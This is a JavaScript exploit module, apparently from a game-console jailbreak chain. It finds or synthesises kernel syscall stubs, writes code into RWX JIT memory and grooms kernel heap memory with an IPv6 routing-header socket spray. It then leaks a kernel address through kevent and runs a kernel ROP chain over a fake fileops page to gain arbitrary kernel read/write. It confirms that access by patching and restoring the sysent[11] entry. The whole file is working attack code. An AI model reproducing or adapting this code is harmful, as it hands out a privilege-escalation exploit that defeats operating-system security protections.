// kevent_krw_verify.js — hard-fail on stubs, widened scan
import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

const T = HX1400_TABLES;
const P = T.P;

const HX = (() => {
  const S = { kbase: 0n, ctx: null, p: null, stubAddr: null, libkernelBase: 0n, keepAlive: [], mark: null };
  const P_ = {
    SE11: 0, KEXECG: 1, HEN_SIZE: 2, HEN_ENTRY: 3,
    OFF_FIXES: 4, OFF_MMAP: 5, OFF_BLOCKUPD: 6, OFF_ASLR: 7,
    OFF_NOBD: 8, OFF_SKIP: 9, CFG_UPLOAD: 10, CFG_PLUGINS: 11,
    ANCHOR: 12, R_SLOT: 13, R_OPS: 14,
    R_RET0: 15, R_TOUCH: 16,
    R_POPRSP: 17, R_SAVE: 18, R_REST: 19, R_CONT: 20,
    R_PRAX: 21, R_PRDX: 22, R_PRDI: 23,
    R_UCRED: 24, R_RAXRCX: 25, R_LDRAX: 26, R_ADDRAX: 27,
    R_STRAXRDX: 28, R_STRDIRAX: 29, R_UIDPAIR: 30,
  };

  function bind(c) {
    S.ctx = c; S.p = c.p; S.stubAddr = c.stubAddr;
    S.libkernelBase = BigInt(num(c.libkernelBase));
    S.keepAlive = c.keepAlive;
    S.mark = (t, d) => c.mark(t, d === undefined ? "" : String(d));
  }
  function num(v) {
    if (typeof v === "bigint") return v;
    if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
    return BigInt(v >>> 0);
  }
  function toI64(v) {
    if (v instanceof int64) return v;
    v = BigInt(v);
    return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
  }
  function h16(v) {
    if (typeof v === "bigint") return "0x" + v.toString(16);
    if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
    return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
  }
  function ka(rva) { return S.kbase + BigInt(rva >>> 0); }
  function ac(addr, a, b, c, d, e, f) {
    return S.ctx.callAddr(toI64(addr), [toI64(a), toI64(b), toI64(c), toI64(d), toI64(e), toI64(f)]);
  }

  const ARENAS = [];
  function alloc(size) {
    const ab = new ArrayBuffer(size); S.keepAlive.push(ab);
    const dv = new DataView(ab);
    const e = { ab, dv, addr: num(S.ctx.bufAddr(ab)) };
    ARENAS.push(e); return e;
  }

  let wStuck = 0, lastBase = 0n;
  const ANCHOR = num(P[P_.ANCHOR]);
  
  function wash(aiocb, aiocan, aiocanpoll, aiocandel, ap, ap2, ap3, ap4, ap5, n) {
    wStuck = 0;
    const zero = new Uint8Array(64);
    for (let i = 0; i < n; i++) {
      new Uint8Array(ap.ab).set(zero);
      const rc = ac(num(aiocb.addr), 4097, ap.addr, 5, 3, ap.addr, 0);
      if (rc.i32 !== 0) return i;
      new Uint8Array(ap2.ab).set(zero);
      ac(num(aiocan.addr), ap.addr, 5, ap2.addr, 0, 0, 0);
      let stuck = 0;
      for (let t = 0; t < 4; t++) {
        new Uint8Array(ap4.ab).set(zero); ac(num(aiocanpoll.addr), ap.addr, 5, ap4.addr, 0, 0, 0);
        new Uint8Array(ap5.ab).set(zero); ac(num(aiocandel.addr), ap.addr, 5, ap5.addr, 0, 0, 0);
        stuck = 0; for (let k = 0; k < 5; k++) if (ap5.dv.getInt32(k * 4, true) !== 0) stuck++;
        if (stuck === 0) break;
      }
      if (stuck !== 0) wStuck++;
    }
    return n;
  }
  
  function parse(buf, used) {
    lastBase = 0n;
    if (used <= 0n || used > 32768n) return;
    let base = 0n, cnt = 0, multi = false;
    for (let off = 0n; off + 16n <= used; off += BigInt(buf.dv.getUint16(Number(off), true) || 16)) {
      const len = buf.dv.getUint16(Number(off), true);
      if (len < 16 || off + BigInt(len) > used) break;
      if (buf.dv.getUint8(Number(off) + 3) === 4 && len >= 40) {
        const lo = BigInt(buf.dv.getUint32(Number(off) + 32, true));
        const hi = BigInt(buf.dv.getUint32(Number(off) + 36, true));
        const v = (hi << 32n) | lo;
        if (hi === 0xffffffffn && lo !== 0n && lo !== 0xffffffffn) {
          const d = v - ANCHOR;
          if ((d & 16383n) === 0n && ((d >> 32n) & 0xffffffffn) === 0xffffffffn) {
            if (cnt === 0) { base = d; cnt = 1; }
            else if (base === d) cnt++; else multi = true;
          }
        }
      }
    }
    if (cnt > 0 && !multi) lastBase = base;
  }

  let gSTACK = 0n, gCTX = 0n, gMARK = 0n, gRES = 0n;
  let gIDENT = 3545541614998146895n;
  let MARKV = 5570198814713989681n;
  
  function w8(base, off, v) { S.p.write8(toI64(base + BigInt(off) * 8n), toI64(v)); return off + 1; }
  
  function kb0() { 
    let o = 0; 
    o = w8(gSTACK, o, ka(P[P_.R_PRDI])); 
    o = w8(gSTACK, o, gCTX); 
    o = w8(gSTACK, o, ka(P[P_.R_SAVE])); 
    return o; 
  }
  
  function kb1(o) {
    o = w8(gSTACK, o, ka(P[P_.R_PRAX]));  o = w8(gSTACK, o, gIDENT);
    o = w8(gSTACK, o, ka(P[P_.R_PRDI]));  o = w8(gSTACK, o, gMARK);
    o = w8(gSTACK, o, ka(P[P_.R_STRDIRAX])); o = w8(gSTACK, o, 0n);
    o = w8(gSTACK, o, ka(P[P_.R_PRAX]));  o = w8(gSTACK, o, gCTX + 16n);
    o = w8(gSTACK, o, ka(P[P_.R_LDRAX])); o = w8(gSTACK, o, 0n);
    o = w8(gSTACK, o, ka(P[P_.R_PRDX]));  o = w8(gSTACK, o, -120n);
    o = w8(gSTACK, o, ka(P[P_.R_ADDRAX])); o = w8(gSTACK, o, 0n);
    o = w8(gSTACK, o, ka(P[P_.R_PRDI]));  o = w8(gSTACK, o, gCTX + 8n);
    o = w8(gSTACK, o, ka(P[P_.R_STRDIRAX])); o = w8(gSTACK, o, 0n);
    o = w8(gSTACK, o, ka(P[P_.R_PRAX]));  o = w8(gSTACK, o, ka(P[P_.R_CONT]));
    o = w8(gSTACK, o, ka(P[P_.R_PRDI]));  o = w8(gSTACK, o, gCTX + 56n);
    o = w8(gSTACK, o, ka(P[P_.R_STRDIRAX])); o = w8(gSTACK, o, 0n);
    o = w8(gSTACK, o, ka(P[P_.R_PRDI]));  o = w8(gSTACK, o, gCTX);
    o = w8(gSTACK, o, ka(P[P_.R_REST]));
    return o;
  }
  
  function kgo(ske, evb, kq, o) {
    if (o > 112) return false;
    S.p.write8(toI64(gMARK), 0n);
    for (let i = 0; i < 64; i += 8) S.p.write8(toI64(evb + BigInt(i)), 0n);
    S.p.write8(toI64(evb), gIDENT);
    S.p.write2(toI64(evb + 8n), -23);
    S.p.write2(toI64(evb + 10n), 1);
    S.p.write8(toI64(evb + 32n), ka(P[P_.R_POPRSP]));
    S.p.write8(toI64(evb + 40n), gSTACK);
    ac(num(ske), kq, evb, 2n, 0n, 0n, 0n);
    return S.p.read8(toI64(gMARK)) === MARKV;
  }
  
  function kread(ske, evb, kq, addr) {
    let o = kb0();
    o = w8(gSTACK, o, ka(P[P_.R_PRAX])); o = w8(gSTACK, o, addr);
    o = w8(gSTACK, o, ka(P[P_.R_LDRAX])); o = w8(gSTACK, o, 0n);
    o = w8(gSTACK, o, ka(P[P_.R_PRDI])); o = w8(gSTACK, o, gRES);
    o = w8(gSTACK, o, ka(P[P_.R_STRDIRAX])); o = w8(gSTACK, o, 0n);
    o = kb1(o);
    S.p.write8(toI64(gRES), 0n);
    if (!kgo(ske, evb, kq, o)) return null;
    return S.p.read8(toI64(gRES));
  }
  
  function kwrite(ske, evb, kq, addr, val) {
    let o = kb0();
    o = w8(gSTACK, o, ka(P[P_.R_PRAX])); o = w8(gSTACK, o, addr);
    o = w8(gSTACK, o, ka(P[P_.R_PRDX])); o = w8(gSTACK, o, val);
    o = w8(gSTACK, o, ka(P[P_.R_STRAXRDX])); o = w8(gSTACK, o, 0n);
    o = kb1(o);
    return kgo(ske, evb, kq, o);
  }

  return {
    bind, ka, h16, wash, parse, kread, kwrite, ac,
    setStack: (base, ctx, mark, res) => { gSTACK = base; gCTX = ctx; gMARK = mark; gRES = res; },
    setKbase: (v) => { S.kbase = v; },
    getLastBase: () => lastBase,
    getWStuck: () => wStuck,
  };
})();

const NUM = {
  read: 3, write: 4, open: 5, close: 6, munmap: 73,
  socket: 97, setsockopt: 105, getsockopt: 118,
  sysctl: 202, mmap: 477, kqueue: 362, kevent: 363,
  cpuctl: 487, cpuctl_set: 488,
  aio_submit: 669, aio_cancel: 666, aio_cancel_poll: 664, aio_cancel_del: 662,
  fstat: 189, jitshm_create: 533,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;
const TPL_LO = 0x43434343, TPL_HI = 0x54545454;
const DEV_DCE = "/dev/dce";
const OPS_OFF = 0x985a;
const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
const ROUNDS = 6;
const EXPECTED_KBASE = 0xffffffffd5528000n;

const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) { return HX.h16(v); }
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }

let SCAN_SEEN = 0;
function findStubRaw(snum) {
  const p = ctx().p;
  const base = num(ctx().libkernelBase);
  const want = snum >>> 0;
  const LIMIT = 0x80000;
  // Log base so we see what libkernelBase actually is
  if (SCAN_SEEN === 0) log("NATIVES-BASE", "libkernelBase=" + h16(base));
  for (let off = 0; off < LIMIT; off += 4) {
    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
    if ((w & 0x00ffffff) !== 0xc0c748) continue;
    const b3 = p.read1(toI64(base + BigInt(off + 4)));
    const b4 = p.read1(toI64(base + BigInt(off + 5)));
    const b5 = p.read1(toI64(base + BigInt(off + 6)));
    const imm = (((w >>> 24) & 0xff) | (b3 << 8) | (b4 << 16) | (b5 << 24)) >>> 0;
    let isStub = false;
    // Widened: 0F 05 anywhere in the next 32 bytes
    for (let k = 7; k <= 32; k++) {
      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f &&
          p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) { isStub = true; break; }
    }
    if (!isStub) continue;
    SCAN_SEEN++;
    if (imm === want) return base + BigInt(off);
  }
  return null;
}
function synthStub(targetNum) {
  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
  const daddr = num(ctx().stubAddr.get(donorNum));
  const p = ctx().p;
  if (p.read1(toI64(daddr)) !== 0x48 || p.read1(toI64(daddr + 1n)) !== 0xc7 || p.read1(toI64(daddr + 2n)) !== 0xc0) return { err: "donor not 48 c7 c0" };
  const donorImm = (p.read1(toI64(daddr + 3n)) | (p.read1(toI64(daddr + 4n)) << 8) | (p.read1(toI64(daddr + 5n)) << 16) | (p.read1(toI64(daddr + 6n)) << 24)) >>> 0;
  if (donorImm !== donorNum) return { err: "donor imm mismatch" };
  let jfd = scn("jitshm_create", 0, 16384, 7);
  if (jfd < 0) { const nb = allocBuf(32); zeroBuf(nb); jfd = scn("jitshm_create", nb.addr, 16384, 7); }
  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
  for (let o = 0; o < 32; o += 4) p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
  const w1 = ((((targetNum & 0xff) << 24) >>> 0) | 0x00c0c748) >>> 0;
  p.write4(toI64(addr), w1);
  const tailByte0 = p.read1(toI64(daddr + 7n));
  const w2 = (((targetNum >>> 8) & 0xff) | (((targetNum >>> 16) & 0xff) << 8) | (((targetNum >>> 24) & 0xff) << 16) | (tailByte0 << 24)) >>> 0;
  p.write4(toI64(addr + 4n), w2);
  log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum + " jfd=" + jfd + " rwx=" + h16(addr));
  return { addr };
}
function ensureStubs() {
  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) { const a = findStubRaw(NUM[k]); if (a !== null) { ctx().stubAddr.set(NUM[k], toI64(a)); log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + a.toString(16)); } }
  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) { const r = synthStub(NUM[k]); if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr)); else log("SYNTH-FAIL", k + ": " + r.err); }
  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  // HARD FAIL: if even one stub is missing, we cannot proceed.
  if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
}

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name]; const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing at call: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}
function scn64(name, a, b, c, d, e, f) {
  const n = NUM[name]; const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing at call: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
}

function buildTemplate() {
  const tpl = allocBuf(512); zeroBuf(tpl);
  tpl.dv.setUint8(1, 30); tpl.dv.setUint8(3, 15);
  for (let off = 8; off + 8 <= RTH_LEN; off += 8) { tpl.dv.setUint32(off, TPL_LO, true); tpl.dv.setUint32(off + 4, TPL_HI, true); }
  return tpl;
}
function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }
function marked(fd, rdb, lenp) {
  zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
}
function phaseSpray(N) {
  const fds = [];
  for (let i = 0; i < N; i++) { const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0); if (fd <= 0) break; fds.push(fd); }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  const rth = allocBuf(512);
  for (const fd of fds) scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}
function phase2Leak(rootKq, fds) {
  const rdb = allocBuf(512), lenp = allocBuf(8), cl = allocBuf(64);
  const tpl = buildTemplate();
  const dev = allocBuf(32); zeroBuf(dev);
  for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));
  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
  let kva = -1n, pageVal = 0n, tries = 0, blind = 0;
  for (let attempt = 1; attempt <= ROUNDS; attempt++) {
    if (target >= 0) break;
    log("KV-ATTEMPT", attempt + "/" + ROUNDS);
    for (const fd of fds) if (fd !== -1) disarm(fd);
    for (const fd of fds) if (fd !== -1) rearm(fd, tpl);
    for (let ci = 0; ci < CANDS.length && target < 0; ci++) {
      const vi = CANDS[ci];
      if (vi >= fds.length) continue;
      const fd = fds[vi];
      if (fd === -1) continue;
      if (!marked(fd, rdb, lenp)) continue;
      if (disarm(fd) !== 0) continue;
      scn("close", fd); fds[vi] = -1;
      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0);
      if (dce < 0) continue;
      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
      const pageInt = Number(page & 0xffffffffn) | 0;
      tries++;
      zeroBuf(cl);
      cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 1, true); cl.dv.setUint32(16, 90, true);
      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
      let joined = 0;
      if (rc === 0) {
        for (let j = 0; j < fds.length; j++) {
          if (j === vi || fds[j] === -1) continue;
          zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
          if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
          const v8 = rdb.dv.getInt32(8, true);
          const v12 = rdb.dv.getUint32(12, true) >>> 0;
          if (v8 === pageInt && v12 === 0) { joined++; if (target < 0) { target = j; targetFd = fds[j]; } log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined); }
          else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {} else { rearm(fds[j], tpl); }
        }
      }
      if (target >= 0 && joined === 1) {
        zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true);
        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
        else { candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt; log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page)); }
      } else {
        if (rc === 0) { blind++; zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true); scn("kevent", rootKq, cl.addr, 1, 0, 0, 0); }
        scn("close", dce); rearm(fd, tpl); fds[vi] = fd;
      }
    }
  }
  if (kva === -1n) fin("leak scan: no victim held");
  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx + " blind_writes=" + blind);
  return { kva, page: pageVal, targetFd };
}

export async function runKevent(c) {
  STATE.ctx = c;
  HX.bind(c);

  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
  if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
  else if (c.kbase) { STATE.kbase = num(c.kbase); log("KEVENT-KBASE-FROM-HX1400", h16(STATE.kbase)); }
  else { STATE.kbase = EXPECTED_KBASE; log("KEVENT-KBASE-DEFAULT", h16(STATE.kbase)); }
  HX.setKbase(STATE.kbase);

  const kbaseHi = STATE.kbase >> 32n;
  if (kbaseHi !== 0xffffffffn || STATE.kbase > 0xffffffff8fffffffn) {
    log("KEVENT-KBASE-FIX", "forcing to " + h16(EXPECTED_KBASE));
    STATE.kbase = EXPECTED_KBASE;
    HX.setKbase(STATE.kbase);
  }

  ensureStubs(); // hard fails if it cannot find every syscall

  const burn = [];
  for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
  log("FD-BURN", "burned " + burn.length + " fds");

  for (let i = 0; i < burn.length - 20; i++) scn("close", burn[i]);
  burn.length = 20;
  if (typeof gc === "function") gc();
  log("GC-FORCED", "after fd burn trim");

  scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const { fds } = phaseSpray(128);
  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");

  const res = phase2Leak(leakKq, fds);
  STATE.kva = res.kva;
  STATE.targetFd = res.targetFd;

  if (typeof gc === "function") gc();
  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
  STATE.fakePage = fake_page;
  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));

  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
  const p = ctx().p;
  const F_FAKE_OPS = fake_page + 0x800n;
  for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
  p.write4(toI64(F_FAKE_OPS), 0);
  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
  log("STAGE3-OPS", "fake fileops at " + h16(F_FAKE_OPS));

  const gSTACK = fake_page + 0x1000n;
  const gCTX   = gSTACK + 0x700n;
  const gMARK  = gSTACK + 0x680n;
  const gRES   = gSTACK + 0x600n;
  HX.setStack(gSTACK, gCTX, gMARK, gRES);
  log("STAGE4-ROP", "stack=" + h16(gSTACK) + " ctx=" + h16(gCTX) + " mark=" + h16(gMARK) + " res=" + h16(gRES));

  const ap = allocBuf(64), ap2 = allocBuf(64), ap3 = allocBuf(64), ap4 = allocBuf(64), ap5 = allocBuf(64);
  const buf = allocBuf(32768);
  const n = HX.wash({ addr: ap.addr }, { addr: ap2.addr }, { addr: ap3.addr }, { addr: ap4.addr }, ap, ap2, ap3, ap4, ap5, 32);
  if (n !== 32) fin("wash stalled " + n);
  HX.parse({ ab: buf.ab, dv: buf.dv, addr: buf.addr }, 32768n);
  const found = HX.getLastBase();
  log("STAGE5-PARSE", "kbase discovered = " + (found !== 0n ? h16(found) : "none"));
  if (found !== 0n && found !== STATE.kbase) {
    log("STAGE5-FIX", "parse overrides to " + h16(found));
    STATE.kbase = found;
    HX.setKbase(found);
  }

  const ske = num(ctx().stubAddr.get(NUM.kevent));
  const rootKq = scn("kqueue");
  if (rootKq < 0) fin("root kqueue");
  const evb = allocBuf(64);

  const se11 = ka(P[0]);
  const se11_narg = se11 + 4n;
  
  const orig_call = HX.kread(ske, evb.addr, BigInt(rootKq), se11);
  if (orig_call === null) fin("kread failed: gate closed (kgo returned false)");
  log("VERIFY-R", "sysent[11].sy_call = " + h16(orig_call));

  const orig_narg = HX.kread(ske, evb.addr, BigInt(rootKq), se11_narg);
  if (orig_narg === null) fin("kread narg failed");
  log("VERIFY-R", "sysent[11].sy_narg = " + h16(orig_narg));

  const probe = 0x2n;
  const wok = HX.kwrite(ske, evb.addr, BigInt(rootKq), se11_narg, probe);
  if (!wok) fin("kwrite failed: gate closed (kgo returned false)");
  const rt = HX.kread(ske, evb.addr, BigInt(rootKq), se11_narg);
  if (rt === null) fin("kread readback failed");
  log("VERIFY-W", "wrote 0x" + probe.toString(16) + " -> readback = " + h16(rt));

  if (rt !== probe) fin("R/W round-trip FAILED: read " + h16(rt) + " want 0x" + probe.toString(16));
  log("VERIFY-W", "*** R/W ROUND-TRIP OK ***");

  const rok = HX.kwrite(ske, evb.addr, BigInt(rootKq), se11_narg, orig_narg);
  if (!rok) log("VERIFY-RESTORE", "restore kwrite returned false (kgo fail)");
  const rr = HX.kread(ske, evb.addr, BigInt(rootKq), se11_narg);
  log("VERIFY-RESTORE", "restored -> " + h16(rr) + " orig was " + h16(orig_narg));

  STATE.rwReady = true;
  const out = {
    kbase: STATE.kbase,
    kva: STATE.kva,
    fakePage: STATE.fakePage,
    se11_call: orig_call,
    se11_narg_orig: orig_narg,
    se11_narg_after: rr,
    rwReady: true,
    verified: rt === probe && rr === orig_narg,
  };
  log("RESULT", JSON.stringify(Object.fromEntries(Object.entries(out).map(([k, v]) => [k, typeof v === "bigint" ? h16(v) : v]))));
  return out;
}
